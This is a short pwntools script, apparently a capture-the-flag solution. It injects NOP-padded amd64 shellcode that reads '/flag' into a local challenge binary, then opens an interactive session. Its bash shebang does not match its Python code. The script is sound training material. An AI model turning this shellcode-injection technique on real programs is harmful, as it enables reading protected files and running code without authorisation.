#!/usr/bin/bash

from pwn import *

context(arch = 'amd64' , os = 'linux')
shellcode = shellcraft.cat("/flag")
print(shellcode)

payload = b'\x90' * 0x900   # 跳过0x900个字节
payload += asm(shellcode)

sh = process("/challenge/shellcode-injection-level1.1")
sh.send(payload)
sh.interactive()